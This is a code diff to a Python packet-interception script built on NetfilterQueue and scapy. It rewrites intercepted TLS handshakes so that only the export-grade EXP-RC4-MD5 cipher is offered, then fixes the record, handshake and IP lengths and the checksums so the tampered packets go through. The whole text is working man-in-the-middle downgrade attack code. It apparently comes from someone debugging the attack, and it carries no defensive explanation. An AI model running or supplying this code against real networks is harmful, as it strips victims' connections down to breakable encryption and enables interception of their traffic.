@@ -20,25 +20,29 @@ from netfilterqueue import NetfilterQueue
 
 def fix_lengths(payload):
     payload = bytearray(payload)
-    
+
+    # Fix outer TLS record version to TLS 1.2 (0x03 0x03)
+    payload[1] = 0x03
+    payload[2] = 0x03
+
     # Fix TLS record length (bytes 3-4)
     record_len = len(payload) - 5
     payload[3] = (record_len >> 8) & 0xFF
     payload[4] = record_len & 0xFF
-    
-    # Fix handshake length (bytes 6-8, 3 bytes)
+
+    # Fix handshake length (bytes 6-8)
     handshake_len = len(payload) - 9
     payload[6] = (handshake_len >> 16) & 0xFF
     payload[7] = (handshake_len >> 8) & 0xFF
     payload[8] = handshake_len & 0xFF
-    
+
     return bytes(payload)
 
 def modify_ciphers(payload):
     cipher_start, cipher_end = find_cipher_suites(payload)
     
-    # EXP-RC4-MD5 is 0x00 0x62
-    new_ciphers = b'\x00\x62'
+    # EXP-RC4-MD5 is 0x00 0x03
+    new_ciphers = b'\x00\x03'
     new_cipher_len = len(new_ciphers).to_bytes(2, 'big')
     
     # Rebuild payload with modified cipher list
@@ -93,15 +97,24 @@ def process_packet(packet):
             # modify and fix lengths
             modified = modify_ciphers(payload)
             modified = fix_lengths(modified)
+
+            # DEBUG LINES
+            print(f"Original length: {len(payload)}")
+            print(f"Modified length: {len(modified)}")
+            print(f"First 10 bytes: {modified[:10].hex()}")
+            cipher_start, cipher_end = find_cipher_suites(payload)
+            print(f"Cipher bytes in modified: {modified[cipher_start-2:cipher_end-len(payload)+len(modified)].hex()}")
             
-            # replace TCP payload with modified one
+            
             scapy_packet[TCP].payload = Raw(modified)
-            
-            # delete old checksums so scapy recomputes them
+
+            # fix IP total length explicitly
+            scapy_packet[IP].len = len(bytes(scapy_packet))
+
+            # recalculate checksums
             del scapy_packet[IP].chksum
             del scapy_packet[TCP].chksum
-            
-            # put modified packet back
+
             packet.set_payload(bytes(scapy_packet))
             print("Ciphers stripped! Only EXP-RC4-MD5 remains.")
     
